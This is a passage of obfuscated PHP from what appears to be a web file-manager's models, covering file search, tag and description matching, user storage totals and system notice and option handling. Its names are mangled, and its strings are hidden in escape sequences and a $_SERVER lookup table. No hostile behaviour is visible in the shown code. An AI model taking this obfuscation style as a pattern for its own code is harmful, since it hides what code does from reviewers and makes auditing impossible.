($îçÎĞÔ as $°¸‘©É…) { if (!$°¸‘©É… || count($°¸‘©É…) <= 1) { continue; } foreach ($°¸‘©É… as $¬û´ı°ì) { $ÃÆ¥ë[] = $¬û´ı°ì[$¢”ıÉö‹[517]]; $´şÑ›Ó[] = $¬û´ı°ì[$¢”ıÉö‹[451]]; } } if (!$´şÑ›Ó) { return; } $this->where(array($¢”ıÉö‹[451] => array($¢”ıÉö‹[7], $´şÑ›Ó)))->delete(); Model($¢”ıÉö‹[520])->remove($ÃÆ¥ë); } public function userSpace() { $ˆ”ğÚ² =& $_SERVER[‚ûòÉ˜ş]; $û³©º—å = $this->tablePrefix; $™¼ÎÄãË = array($ˆ”ğÚ²[1678] => USER_ID); $ÊµÇšÉº = "{$û³©º—å}\x69\x6f\137\x66\x69\x6c\x65\40\146\x69\x6c\x65\x73\x20\x6f\156\x20\x66\x69\x6c\145\163\56\146\151\154\x65\111\x44\40\x3d\x20\150\x69\163\164\157\162\x79\x2e\146\x69\x6c\x65\x49\104"; return $this->alias($ˆ”ğÚ²[2138])->where($™¼ÎÄãË)->join($ÊµÇšÉº, $ˆ”ğÚ²[2139])->sum($ˆ”ğÚ²[86]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ÆŞñ”ã) { $´’ êì¤ =& $_SERVER[‚ûòÉ˜ş]; $©±ºóä¢ = KodIO::fileTypeList(); $ƒ­Š„äÍ = $©±ºóä¢[$ÆŞñ”ã]; if (!$ƒ­Š„äÍ) { return array(); } $¤û¶ÓÀÑ = $ƒ­Š„äÍ[$´’ êì¤[185]]; $‡°Ñğºâ = $´’ êì¤[7]; if (!$ƒ­Š„äÍ[$´’ êì¤[185]]) { $ì‚³‰Ç‘ = array_to_keyvalue($©±ºóä¢, $´’ êì¤[12], $´’ êì¤[185]); $¤û¶ÓÀÑ = implode($´’ êì¤[60], $ì‚³‰Ç‘); $‡°Ñğºâ = $´’ êì¤[2141]; } $–‰¡Ã¦â = explode($´’ êì¤[60], trim($¤û¶ÓÀÑ, $´’ êì¤[60])); return array($‡°Ñğºâ, $–‰¡Ã¦â); } public function listPathType($¤Ğôš¸Ğ) { $µµÔ­ÀÔ =& $_SERVER[‚ûòÉ˜ş]; $¨—«‘ë¥ = $this->fileTypeWhere($¤Ğôš¸Ğ); if (!$¨—«‘ë¥) { return array(); } $ç¬ëãæœ = USER_ID; $šÒìôšï = Model($µµÔ­ÀÔ[575])->getInfo($ç¬ëãæœ); $÷¢­æö¨ = array($µµÔ­ÀÔ[624] => SourceModel::TYPE_USER, $µµÔ­ÀÔ[561] => array($µµÔ­ÀÔ[588], $µµÔ­ÀÔ[571] . $šÒìôšï[$µµÔ­ÀÔ[97]][$µµÔ­ÀÔ[191]] . $µµÔ­ÀÔ[589]), $µµÔ­ÀÔ[625] => $ç¬ëãæœ, $µµÔ­ÀÔ[622] => 0, $µµÔ­ÀÔ[623] => $¨—«‘ë¥); return $this->listSource($÷¢­æö¨); } public function listSearch($­½úà¥, $´şƒ™é“ = 300) { $¡ÍÅÍÎí =& $_SERVER[‚ûòÉ˜ş]; if (isset($­½úà¥[$¡ÍÅÍÎí[1979]]) && $­½úà¥[$¡ÍÅÍÎí[1979]]) { $­½úà¥[$¡ÍÅÍÎí[1979]] = str_replace($¡ÍÅÍÎí[436], $¡ÍÅÍÎí[2142], trim($­½úà¥[$¡ÍÅÍÎí[1979]])); } $æĞß¿ñÃ = $this->_parseSearchWhere($­½úà¥); if (!isset($æĞß¿ñÃ[$¡ÍÅÍÎí[481]])) { $æĞß¿ñÃ[$¡ÍÅÍÎí[481]] = 0; } $ÊŠÌ›« = $¡ÍÅÍÎí[2143]; $úëí’½š = $æĞß¿ñÃ; $ï¡—äÏ™ = $ÊŠÌ›«; $this->_listSearchBindPinyin($­½úà¥, $æĞß¿ñÃ, $ÊŠÌ›«); $this->alias($¡ÍÅÍÎí[495])->_makeOrder(); $æĞß¿ñÃ = $this->parseWhereLike($æĞß¿ñÃ); $Òªéé¡ = $this->distinct(!0)->field($ÊŠÌ›«)->where($æĞß¿ñÃ)->selectPage($´şƒ™é“); if ($GLOBALS[$¡ÍÅÍÎí[6]][$¡ÍÅÍÎí[433]][$¡ÍÅÍÎí[434]] && Input::check($­½úà¥[$¡ÍÅÍÎí[1979]], $¡ÍÅÍÎí[631]) && $Òªéé¡[$¡ÍÅÍÎí[419]][$¡ÍÅÍÎí[406]] == 1 && $Òªéé¡[$¡ÍÅÍÎí[419]][$¡ÍÅÍÎí[420]] == 0) { $Òªéé¡ = $this->distinct(!0)->field($ÊŠÌ›«)->where($úëí’½š)->limit(1000)->select(); $Òªéé¡ = array_page_split($Òªéé¡, !1, $´şƒ™é“); } $this->_listSearchFileContent($Òªéé¡, $­½úà¥, $ï¡—äÏ™, $úëí’½š); $this->_listSearchDesc($Òªéé¡, $­½úà¥, $ï¡—äÏ™); $this->_listSearchTag($Òªéé¡, $­½úà¥, $ï¡—äÏ™); $this->_listSearchGroupTag($Òªéé¡, $­½úà¥, $ï¡—äÏ™); $this->_listDataApply($Òªéé¡[$¡ÍÅÍÎí[422]]); $this->_listMake($Òªéé¡); return $Òªéé¡; } private function _listSearchFileContent(&$ûÌÎÚ½ö, $ğ¦•íßÍ, $¤ù¤›ò, $¡ØÀ·è) { $ÙÚ‚¥Á =& $_SERVER[‚ûòÉ˜ş]; if (!$ğ¦•íßÍ[$ÙÚ‚¥Á[1979]] || $ûÌÎÚ½ö[$ÙÚ‚¥Á[419]][$ÙÚ‚¥Á[406]] > 1) { return; } if (!isset($¡ØÀ·è[$ÙÚ‚¥Á[42]]) || !is_array($ğ¦•íßÍ[$ÙÚ‚¥Á[517]])) { return; } $¡ØÀ·è[$ÙÚ‚¥Á[517]] = array($ÙÚ‚¥Á[7], $ğ¦•íßÍ[$ÙÚ‚¥Á[517]]); unset($¡ØÀ·è[$ÙÚ‚¥Á[42]]); unset($ğ¦•íßÍ[$ÙÚ‚¥Á[517]]); $Ú•³•ıİ = $this->field($¤ù¤›ò)->where($¡ØÀ·è)->limit($ÙÚ‚¥Á[2144])->select(); if (!$Ú•³•ıİ || count($Ú•³•ıİ) == 0) { return; } $ûÌÎÚ½ö[$ÙÚ‚¥Á[422]] = array_merge($Ú•³•ıİ, $ûÌÎÚ½ö[$ÙÚ‚¥Á[422]]); $ûÌÎÚ½ö[$ÙÚ‚¥Á[419]][$ÙÚ‚¥Á[420]] += count($Ú•³•ıİ); } private function _listSearchTag(&$ìŸ§ŸÂÍ, $³•¤—º, $ş‚µ‚éÓ) { $ĞºÌé =& $_SERVER[‚ûòÉ˜ş]; if (!$³•¤—º[$ĞºÌé[1979]] || $ìŸ§ŸÂÍ[$ĞºÌé[419]][$ĞºÌé[406]] > 1) { return; } $ÄİÈ“ŒÉ = Model($ĞºÌé[2145])->listData(); $±·Æî… = array(); $İªÎ´°¡ = $³•¤—º[$ĞºÌé[1979]]; foreach ($ÄİÈ“ŒÉ as $€Œ•“—ˆ) { $˜î»Ç³ = $€Œ•“—ˆ[$ĞºÌé[42]]; $‡½æ—ş× = str_replace($ĞºÌé[63], $ĞºÌé[12], Pinyin::get($˜î»Ç³)); if (stripos($˜î»Ç³, $İªÎ´°¡) !== !1 || stripos($‡½æ—ş×, $İªÎ´°¡) !== !1) { $±·Æî…[] = $€Œ•“—ˆ[$ĞºÌé[451]]; } } if (!$±·Æî…) { return; } $ÓšŒÖ×Â = array($ĞºÌé[476] => array($ĞºÌé[7], $±·Æî…), $ĞºÌé[1687] => USER_ID); $ŒÅÎ©—ü = Model($ĞºÌé[478])->field($ĞºÌé[94])->where($ÓšŒÖ×Â)->select(); $ŒÅÎ©—ü = array_to_keyvalue($ŒÅÎ©—ü, $ĞºÌé[12], $ĞºÌé[94]); $á¤ø›±Â = array_unique($ŒÅÎ©—ü); $this->_listSearchMerge($ìŸ§ŸÂÍ, $³•¤—º, $ş‚µ‚éÓ, $á¤ø›±Â); } private function _listSearchDesc(&$¢…ç¨, $¹‰•³Á, $Œœ—˜í) { $¢Æõ‹èÖ =& $_SERVER[‚ûòÉ˜ş]; if (!$¹‰•³Á[$¢Æõ‹èÖ[1979]] || $¢…ç¨[$¢Æõ‹èÖ[419]][$¢Æõ‹èÖ[406]] > 1) { return; } $ÜŠ§Õ± = array($¢Æõ‹èÖ[104] => $¢Æõ‹èÖ[502], $¢Æõ‹èÖ[427] => array($¢Æõ‹èÖ[435], $¢Æõ‹èÖ[1981] . $¹‰•³Á[$¢Æõ‹èÖ[1979]] . $¢Æõ‹èÖ[1981])); $š¥ÜŠõ× = !1; if ($š¥ÜŠõ×) { $¾Îƒ¦È = $this->listSearchChildren($¹‰•³Á[$¢Æõ‹èÖ[190]]); $¾Îƒ¦È = array_unique($¾Îƒ¦È); if (!$¾Îƒ¦È) { return; } $ÜŠ§Õ±[$¢Æõ‹èÖ[191]] = array($¢Æõ‹èÖ[7], $¾Îƒ¦È); } $ç¨‚‹Ÿº = Model($¢Æõ‹èÖ[608])->field($¢Æõ‹èÖ[191])->where($ÜŠ§Õ±)->limit(5000)->select(); $™µÆ é‚ = array_to_keyvalue($ç¨‚‹Ÿº, $¢Æõ‹èÖ[12], $¢Æõ‹èÖ[191]); $this->_listSearchMerge($¢…ç¨, $¹‰•³Á, $Œœ—˜í, $™µÆ é‚); } private function _listSearchGroupTag(&$ÏùõæŠ, $Üúßî¶š, $Ş­™Şı) { $õÚ±‰üî =& $_SERVER[‚ûòÉ˜ş]; if (!$Üúßî¶š[$õÚ±‰üî[1979]] || $ÏùõæŠ[$õÚ±‰üî[419]][$õÚ±‰üî[406]] > 1 || !$Üúßî¶š[$õÚ±‰üî[190]]) { return; } $Ğ¶É¡å§ = $this->sourceInfo($Üúßî¶š[$õÚ±‰üî[190]]); if (!$Ğ¶É¡å§ || $Ğ¶É¡å§[$õÚ±‰üî[188]] != SourceModel::TYPE_GROUP) { return; } $­ÇšüçÏ = $Ğ¶É¡å§[$õÚ±‰üî[546]]; $±˜ë®š¬ = Model($õÚ±‰üî[2146])->get($­ÇšüçÏ); $ÛÉ»£ß­ = array(); $É—ìÍËö = $Üúßî¶š[$õÚ±‰üî[1979]]; foreach ($±˜ë®š¬[$õÚ±‰üî[422]] as $Ê­×‚ä) { $Ä·¿±å¯ = $Ê­×‚ä[$õÚ±‰üî[42]]; $ãÒŒ•Ù« = str_replace($õÚ±‰üî[63], $õÚ±‰üî[12], Pinyin::get($Ä·¿±å¯)); if (stripos($Ä·¿±å¯, $É—ìÍËö) !== !1 || stripos($ãÒŒ•Ù«, $É—ìÍËö) !== !1) { $ÛÉ»£ß­[] = $Ê­×‚ä[$õÚ±‰üî[451]]; } } if (!$ÛÉ»£ß­) { return; } $®©û×Ê‚ = array($õÚ±‰üî[476] => array($õÚ±‰üî[7], $ÛÉ»£ß­), $õÚ±‰üî[1687] => 0, $õÚ±‰üî[43] => $õÚ±‰üî[2001] . $­ÇšüçÏ); $ĞàİêÔ¹ = Model($õÚ±‰üî[478])->field($õÚ±‰üî[94])->where($®©û×Ê‚)->select(); $ĞàİêÔ¹ = array_to_keyvalue($ĞàİêÔ¹, $õÚ±‰üî[12], $õÚ±‰üî[94]); $¶â£ƒÁ = array_unique($ĞàİêÔ¹); $this->_listSearchMerge($ÏùõæŠ, $Üúßî¶š, $Ş­™Şı, $¶â£ƒÁ); } private function _listSearchMerge(&$—¨“Êü, $ÛÆğŠ¾À, $‘Æ¬Ù¦Û, $‰ÏŞš°) { $ÄçİÌ©¡ =& $_SERVER[‚ûòÉ˜ş]; if (!$‰ÏŞš°) { return; } $›€²íÀ = array_to_keyvalue($—¨“Êü[$ÄçİÌ©¡[422]], $ÄçİÌ©¡[12], $ÄçİÌ©¡[191]); $íĞ‹„Œ = array_diff($‰ÏŞš°, $›€²íÀ); if (!$íĞ‹„Œ) { return; } $¡ªŞ´İñ = array($ÄçİÌ©¡[191] => array($ÄçİÌ©¡[7], $íĞ‹„Œ)); $µê•Ûû = $this->field($‘Æ¬Ù¦Û)->where($¡ªŞ´İñ)->select(); if (!$µê•Ûû) { return; } $”‚¡£éò = array(); foreach ($µê•Ûû as $Ğ‚²µÎ) { if ($this->_listSearchFilter($Ğ‚²µÎ, $ÛÆğŠ¾À)) { $”‚¡£éò[] = $Ğ‚²µÎ; } } $—¨“Êü[$ÄçİÌ©¡[422]] = array_merge($”‚¡£éò, $—¨“Êü[$ÄçİÌ©¡[422]]); $—¨“Êü[$ÄçİÌ©¡[419]][$ÄçİÌ©¡[420]] += count($”‚¡£éò); } private function _listSearchFilter($¡÷¢º©Ó, $ª‹›è‡Ô) { $ºöÈãÚˆ =& $_SERVER[‚ûòÉ˜ş]; $çÔæà‹€ = $¡÷¢º©Ó[$ºöÈãÚˆ[461]] == $ºöÈãÚˆ[98]; if (!strstr($¡÷¢º©Ó[$ºöÈãÚˆ[561]], $ºöÈãÚˆ[60] . $ª‹›è‡Ô[$ºöÈãÚˆ[190]] . $ºöÈãÚˆ[60])) { return !1; } if (isset($ª‹›è‡Ô[$ºöÈãÚˆ[462]]) && $ª‹›è‡Ô[$ºöÈãÚˆ[462]] != $ºöÈãÚˆ[1940]) { if ($ª‹›è‡Ô[$ºöÈãÚˆ[462]] == $ºöÈãÚˆ[85] && !$çÔæà‹€) { return !1; } if ($ª‹›è‡Ô[$ºöÈãÚˆ[462]] != $ºöÈãÚˆ[85] && $çÔæà‹€) { return !1; } if (!strstr($¡÷¢º©Ó[$ºöÈãÚˆ[185]], $ºöÈãÚˆ[60] . $ª‹›è‡Ô[$ºöÈãÚˆ[462]] . $ºöÈãÚˆ[60])) { return !1; } } if (isset($ª‹›è‡Ô[$ºöÈãÚˆ[2147]]) && $ª‹›è‡Ô[$ºöÈãÚˆ[2147]] < $¡÷¢º©Ó[$ºöÈãÚˆ[86]]) { return !1; } if (isset($ª‹›è‡Ô[$ºöÈãÚˆ[2148]]) && $ª‹›è‡Ô[$ºöÈãÚˆ[2148]] > $¡÷¢º©Ó[$ºöÈãÚˆ[86]]) { return !1; } if (isset($ª‹›è‡Ô[$ºöÈãÚˆ[638]]) && $ª‹›è‡Ô[$ºöÈãÚˆ[638]] != $¡÷¢º©Ó[$ºöÈãÚˆ[505]]) { return !1; } return !0; } public function listSearchChildren($·å„œï®, $™óÄ²ù¼ = 5000) { $½íúêá˜ =& $_SERVER[‚ûòÉ˜ş]; $†÷ ÓŸÓ = array(); $‘Í–ï½æ = $this->sourceInfo($·å„œï®); $±Éš„™Û = array($½íúêá˜[561] => array($½íúêá˜[435], $‘Í–ï½æ[$½íúêá˜[561]] . $‘Í–ï½æ[$½íúêá˜[191]] . $½íúêá˜[589])); $©¹º§Çæ = $this->field($½íúêá˜[86])->where($±Éš„™Û)->limit($™óÄ²ù¼ + 1)->select(); $¾Ã¿©½¨ = is_array($©¹º§Çæ) ? count($©¹º§Çæ) : 0; if ($¾Ã¿©½¨ > $™óÄ²ù¼) { return $this->_listSearchChildrenNear($·å„œï®, $™óÄ²ù¼); } $¦ÑîØäì = $this->field($½íúêá˜[191])->where($±Éš„™Û)->select(); $†÷ ÓŸÓ = array_to_keyvalue($¦ÑîØäì, $½íúêá˜[12], $½íúêá˜[191]); return $†÷ ÓŸÓ; } private function _listSearchChildrenNear($×ÔÒ©±Ù, $«õıˆÏ’) { $èªö¹³‹ =& $_SERVER[‚ûòÉ˜ş]; $øÎÏ¸Ò· = array(); $Å“æØß¯ = array($èªö¹³‹[190] => $×ÔÒ©±Ù); $Ãğµ†Ùû = $this->field($èªö¹³‹[2149])->where($Å“æØß¯)->select(); $…ˆÍıÄÃ = array_to_keyvalue(array_filter_by_field($Ãğµ†Ùû, $èªö¹³‹[461], $èªö¹³‹[98]), $èªö¹³‹[12], $èªö¹³‹[191]); $øÎÏ¸Ò· = array_merge($øÎÏ¸Ò·, array_to_keyvalue($Ãğµ†Ùû, $èªö¹³‹[12], $èªö¹³‹[191])); if (!$…ˆÍıÄÃ) { return $øÎÏ¸Ò·; } $Å“æØß¯ = array($èªö¹³‹[190] => array($èªö¹³‹[7], $…ˆÍıÄÃ)); $Ãğµ†Ùû = $this->field($èªö¹³‹[2149])->where($Å“æØß¯)->limit($«õıˆÏ’)->select(); $øÎÏ¸Ò· = array_merge($øÎÏ¸Ò·, array_to_keyvalue($Ãğµ†Ùû, $èªö¹³‹[12], $èªö¹³‹[191])); $øÎÏ¸Ò· = array_slice($øÎÏ¸Ò·, 0, $«õıˆÏ’); return $øÎÏ¸Ò·; } private function _listSearchBindPinyin($¾„é«çƒ, &$Î›Óå‚¢, &$½¥²ØÂ‡) { $šÕ¦Ïªá =& $_SERVER[‚ûòÉ˜ş]; if (!isset($¾„é«çƒ[$šÕ¦Ïªá[1979]]) || !$¾„é«çƒ[$šÕ¦Ïªá[1979]]) { return; } if (!Input::check($¾„é«çƒ[$šÕ¦Ïªá[1979]], $šÕ¦Ïªá[371]) || strlen($¾„é«çƒ[$šÕ¦Ïªá[1979]]) < 2) { return; } $’¼Ú—êó = "\x4c\105\106\124\40\x4a\x4f\111\116\x20{$this->tablePrefix}\x69\x6f\x5f\x73\x6f\x75\x72\x63\145\x5f\155\145\x74\x61\x20\x6d\145\x74\141\40\157\x6e\40\x73\157\x75\x72\143\145\x2e\x73\x6f\x75\162\143\x65\111\x44\40\x3d\x20\x6d\145\164\x61\x2e\163\x6f\165\162\x63\x65\111\104"; $¨ˆ”Û = array(); $½¥²ØÂ‡ = str_replace(array($šÕ¦Ïªá[18], $šÕ¦Ïªá[63], $šÕ¦Ïªá[2150]), $šÕ¦Ïªá[12], $½¥²ØÂ‡); $½¥²ØÂ‡ = $šÕ¦Ïªá[487] . str_replace($šÕ¦Ïªá[60], $šÕ¦Ïªá[488], $½¥²ØÂ‡); $å¼ìªî‚ = $Î›Óå‚¢[$šÕ¦Ïªá[42]]; unset($Î›Óå‚¢[$šÕ¦Ïªá[42]]); foreach ($Î›Óå‚¢ as $³ãå÷ “ => $Äó›Ç³ü) { $¨ˆ”Û[$šÕ¦Ïªá[487] . $³ãå÷ “] = $Äó›Ç³ü; } foreach ($å¼ìªî‚ as $Ûè¦Ÿ‚­) { $¨ˆ”Û[] = array($šÕ¦Ïªá[492] => $Ûè¦Ÿ‚­, $šÕ¦Ïªá[1041] => $šÕ¦Ïªá[1983], array($šÕ¦Ïªá[2151] => $Ûè¦Ÿ‚­, $šÕ¦Ïªá[2152] => array($šÕ¦Ïªá[7], array($šÕ¦Ïªá[514], $šÕ¦Ïªá[513])))); } $this->join($’¼Ú—êó); $Î›Óå‚¢ = $¨ˆ”Û; } private function _parseSearchWhere($ı‘ƒÔ”Â) { $ó“à‡Ã =& $_SERVER[‚ûòÉ˜ş]; $ˆİç÷õ¿ = array(); if (isset($ı‘ƒÔ”Â[$ó“à‡Ã[800]]) && $ı‘ƒÔ”Â[$ó“à‡Ã[800]]) { $ˆİç÷õ¿[$ó“à‡Ã[95]] = array($ó“à‡Ã[2153], $ı‘ƒÔ”Â[$ó“à‡Ã[800]]); } if (isset($ı‘ƒÔ”Â[$ó“à‡Ã[801]]) && $ı‘ƒÔ”Â[$ó“à‡Ã[801]]) { $€¦…Ç©‡ = array($ó“à‡Ã[2154], $ı‘ƒÔ”Â[$ó“à‡Ã[801]]); if ($ˆİç÷õ¿[$ó“à‡Ã[95]]) { $ˆİç÷õ¿[$ó“à‡Ã[95]] = array($ˆİç÷õ¿[$ó“à‡Ã[95]], $€¦…Ç©‡, $ó“à‡Ã[2155]); } else { $ˆİç÷õ¿[$ó“à‡Ã[95]] = $€¦…Ç©‡; } } if (isset($ı‘ƒÔ”Â[$ó“à‡Ã[2147]]) && $ı‘ƒÔ”Â[$ó“à‡Ã[2147]] > 0) { $ˆİç÷õ¿[$ó“à‡Ã[86]] = array($ó“à‡Ã[2153], $ı‘ƒÔ”Â[$ó“à‡Ã[2147]]); } if (isset($ı‘ƒÔ”Â[$ó“à‡Ã[2148]]) && $ı‘ƒÔ”Â[$ó“à‡Ã[2148]]) { $€¦…Ç©‡ = array($ó“à‡Ã[2154], $ı‘ƒÔ”Â[$ó“à‡Ã[2148]]); if ($ˆİç÷õ¿[$ó“à‡Ã[86]]) { $ˆİç÷õ¿[$ó“à‡Ã[86]] = array($ˆİç÷õ¿[$ó“à‡Ã[86]], $€¦…Ç©‡, $ó“à‡Ã[2155]); } else { $ˆİç÷õ¿[$ó“à‡Ã[86]] = $€¦…Ç©‡; } } if (isset($ı‘ƒÔ”Â[$ó“à‡Ã[638]]) && $ı‘ƒÔ”Â[$ó“à‡Ã[638]]) { $ˆİç÷õ¿[] = array($ó“à‡Ã[505] => $ı‘ƒÔ”Â[$ó“à‡Ã[638]], $ó“à‡Ã[503] => $ı‘ƒÔ”Â[$ó“à‡Ã[638]], $ó“à‡Ã[1041] => $ó“à‡Ã[1983]); } if (isset($ı‘ƒÔ”Â[$ó“à‡Ã[462]]) && $ı‘ƒÔ”Â[$ó“à‡Ã[462]]) { $¤´Îù„ = $ı‘ƒÔ”Â[$ó“à‡Ã[462]]; if ($¤´Îù„ == $ó“à‡Ã[85]) { $ˆİç÷õ¿[$ó“à‡Ã[461]] = 1; } else { if ($¤´Îù„ == $ó“à‡Ã[2156]) { $ˆİç÷õ¿[$ó“à‡Ã[461]] = 0; } else { if ($¤´Îù„) { $¤´Îù„ = is_array($¤´Îù„) ? $¤´Îù„ : explode($ó“à‡Ã[60], $¤´Îù„); $ˆİç÷õ¿[$ó“à‡Ã[462]] = array($ó“à‡Ã[468], $¤´Îù„); $ˆİç÷õ¿[$ó“à‡Ã[461]] = 0; } } } } $this->_parseSearchParent($ı‘ƒÔ”Â, $ˆİç÷õ¿); if (isset($ı‘ƒÔ”Â[$ó“à‡Ã[1979]]) && trim($ı‘ƒÔ”Â[$ó“à‡Ã[1979]])) { $ÙÌÓ‰«½ = trim($ı‘ƒÔ”Â[$ó“à‡Ã[1979]]); $•¡ãªê = explode($ó“à‡Ã[63], $ÙÌÓ‰«½); if (strlen($ÙÌÓ‰«½) > 2 && (substr($ÙÌÓ‰«½, 0, 1) == $ó“à‡Ã[128] && substr($ÙÌÓ‰«½, -1) == $ó“à‡Ã[128]) || substr($ÙÌÓ‰«½, 0, 1) == $ó“à‡Ã[68] && substr($ÙÌÓ‰«½, -1) == $ó“à‡Ã[68]) { $ÙÌÓ‰«½ = substr($ÙÌÓ‰«½, 1, -1); $•¡ãªê = array($ÙÌÓ‰«½); } $ˆİç÷õ¿[$ó“à‡Ã[42]] = array(array($ó“à‡Ã[588], $ó“à‡Ã[1981] . $ÙÌÓ‰«½ . $ó“à‡Ã[1981])); if (count($•¡ãªê) > 1) { $ˆİç÷õ¿[$ó“à‡Ã[42]] = array(); foreach ($•¡ãªê as $ìšóæŸ¦) { if (!trim($ìšóæŸ¦)) { continue; } $ˆİç÷õ¿[$ó“à‡Ã[42]][] = array($ó“à‡Ã[588], $ó“à‡Ã[1981] . trim($ìšóæŸ¦) . $ó“à‡Ã[1981]); } } } return $ˆİç÷õ¿; } private function _parseSearchParent($µŞØ¼—, &$‰ñ•÷í) { $É¹§” =& $_SERVER[‚ûòÉ˜ş]; if (!isset($µŞØ¼—[$É¹§”[190]]) || !$µŞØ¼—[$É¹§”[190]]) { return; } $§äÖ¡Ù = $this->pathInfo($µŞØ¼—[$É¹§”[190]]); $åÇòë = $§äÖ¡Ù[$É¹§”[190]] . $É¹§”[12] === $É¹§”[222]; $İ°ĞÕª = $§äÖ¡Ù[$É¹§”[188]] == $É¹§”[555]; if ($§äÖ¡Ù[$É¹§”[572]] == $É¹§”[573]) { $¢‘İ•ª¿ = $this->sourceInfo($µŞØ¼—[$É¹§”[190]]); $§äÖ¡Ù[$É¹§”[561]] = $¢‘İ•ª¿[$É¹§”[561]]; } $‰ñ•÷í[$É¹§”[628]] = array($É¹§”[588], $§äÖ¡Ù[$É¹§”[561]] . $µŞØ¼—[$É¹§”[190]] . $É¹§”[589]); $Ÿæşª¾ = isset($µŞØ¼—[$É¹§”[1844]]) && in_array($É¹§”[555], $µŞØ¼—[$É¹§”[1844]]); if (!$Ÿæşª¾ || !$İ°ĞÕª || !$åÇòë || !$§äÖ¡Ù[$É¹§”[463]]) { return; } if (!AuthModel::authCheckRoot($§äÖ¡Ù[$É¹§”[463]][$É¹§”[464]])) { return; } $²»ÛİÕ„ = $§äÖ¡Ù[$É¹§”[546]] . $É¹§”[12]; if ($²»ÛİÕ„ == $É¹§”[98]) { unset($‰ñ•÷í[$É¹§”[628]]); $‰ñ•÷í[$É¹§”[188]] = self::TYPE_GROUP; return; } $®ªµş± = Model($É¹§”[562])->groupChildrenAll($²»ÛİÕ„); $ÌÔœ´§² = count($®ªµş±); if ($ÌÔœ´§² <= 1) { return; } $±´Åª‹½ = array($É¹§”[190] => 0, $É¹§”[188] => self::TYPE_GROUP, $É¹§”[546] => array($É¹§”[7], $®ªµş±)); $¯²ØÈ€ = $this->field($É¹§”[2157])->where($±´Åª‹½)->limit($ÌÔœ´§²)->select(); $‰ñ•÷í[$É¹§”[628]] = array(); foreach ($¯²ØÈ€ as $ù‰·Àõ) { $‰ñ•÷í[$É¹§”[628]][] = array($É¹§”[588], $É¹§”[571] . $ù‰·Àõ[$É¹§”[191]] . $É¹§”[589]); } $‰ñ•÷í[$É¹§”[628]][] = $É¹§”[1983]; } } goto c‡ÃËùÃ‹ô; dïâ‘óÓÚ¾: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\156\157\164\151\x63\145\x4c\151\163\164"; public $field = array("\x6e\x61\155\x65", "\x63\157\156\x74\x65\156\164", "\141\x75\x74\x68", "\155\x6f\x64\x65", "\164\151\x6d\145", "\164\x79\x70\145", "\x6c\x65\166\145\154", "\145\156\141\x62\154\x65", "\x73\x6f\162\x74"); public function listData($µ”µÚ¡İ = false, $·˜§öÌ¶ = "\163\x6f\162\x74", $ãşÏààÉ = false) { return parent::listData($µ”µÚ¡İ, $·˜§öÌ¶, $ãşÏààÉ); } public function add($à“ÃöñØ) { $©…¨Ÿã =& $_SERVER[‚ûòÉ˜ş]; $•ŞßÍŠî = time(); if ($à“ÃöñØ[$©…¨Ÿã[26]] == $©…¨Ÿã[2320]) { $•ŞßÍŠî = strtotime($à“ÃöñØ[$©…¨Ÿã[204]]); } $à“ÃöñØ[$©…¨Ÿã[204]] = $•ŞßÍŠî; return parent::insert($à“ÃöñØ); } public function update($¶ê™°ö, $‹ÖüëÑ¶) { $î‡•äûÉ =& $_SERVER[‚ûòÉ˜ş]; $˜ó—ÉÄà = $this->listData($¶ê™°ö); if (!$˜ó—ÉÄà) { return !1; } $²ÉÉˆàƒ = time(); if ($‹ÖüëÑ¶[$î‡•äûÉ[26]] == $î‡•äûÉ[2320]) { $²ÉÉˆàƒ = strtotime($‹ÖüëÑ¶[$î‡•äûÉ[204]]); } $‹ÖüëÑ¶[$î‡•äûÉ[204]] = $²ÉÉˆàƒ; return parent::update($¶ê™°ö, $‹ÖüëÑ¶); } public function remove($©º†ğğ) { $±ÀëŸ»Â = $this->listData($©º†ğğ); if (!$±ÀëŸ»Â || $±ÀëŸ»Â[$_SERVER[‚ûòÉ˜ş][189]]) { return !1; } return parent::remove($©º†ğğ); } public function sort($Ú€Ğ¸™Ä, $£Â¹¿“Ô) { return parent::update($Ú€Ğ¸™Ä, $£Â¹¿“Ô); } public function enable($¥õ”˜¼, $ãğÔ—òÄ) { return parent::update($¥õ”˜¼, array($_SERVER[‚ûòÉ˜ş][2321] => $ãğÔ—òÄ)); } private function initUserOption() { $„º¼È•ú =& $_SERVER[‚ûòÉ˜ş]; $this->optionType = $„º¼È•ú[2322]; $this->modelType = $„º¼È•ú[2323]; $this->field = array($„º¼È•ú[2324], $„º¼È•ú[42], $„º¼È•ú[204], $„º¼È•ú[43], $„º¼È•ú[2325], $„º¼È•ú[790], $„º¼È•ú[220]); } public function userNoticeGet($ÔØ‰‚ğû = false) { $this->initUserOption(); return parent::listData($ÔØ‰‚ğû, $_SERVER[‚ûòÉ˜ş][451], !0); } public function userNoticeAdd($¬º’¬î”) { $´ÀÌÕ© =& $_SERVER[‚ûòÉ˜ş]; $this->initUserOption(); $´ä…¼‘ª = $this->findByKey($´ÀÌÕ©[2324], $¬º’¬î”[$´ÀÌÕ©[451]]); if ($´ä…¼‘ª) { return !0; } $ƒııŞó¸ = array($´ÀÌÕ©[2324] => $¬º’¬î”[$´ÀÌÕ©[451]], $´ÀÌÕ©[42] => $¬º’¬î”[$´ÀÌÕ©[42]], $´ÀÌÕ©[204] => $¬º’¬î”[$´ÀÌÕ©[204]], $´ÀÌÕ©[43] => isset($¬º’¬î”[$´ÀÌÕ©[43]]) ? $¬º’¬î”[$´ÀÌÕ©[43]] : 1, $´ÀÌÕ©[2325] => isset($¬º’¬î”[$´ÀÌÕ©[2325]]) ? $¬º’¬î”[$´ÀÌÕ©[2325]] : 0, $´ÀÌÕ©[790] => 0, $´ÀÌÕ©[220] => 0); return parent::insert($ƒııŞó¸); } public function userNoticeEdit($†àÅ†æ, $ã¨×ŒÖ) { $this->initUserOption(); return parent::update($†àÅ†æ, $ã¨×ŒÖ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\145\x6d\137\157\x70\x74\151\157\x6e"; protected $jsonField = array("\155\x65\156\165", "\x72\x6f\154\x65", "\162\x6f\x6c\x65\107\162\x6f\x75\160", "\x72\x65\147\151\163\x74", "\145\155\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($Àş¥ƒ¾) { return "\123\x79\x73\164\x65\155\117\x70\x74\x69\x6f\x6e\137{$Àş¥ƒ¾}"; } protected function optionDefault($Íšªù›Á = '') { $Ö¶Íñ¾´ =& 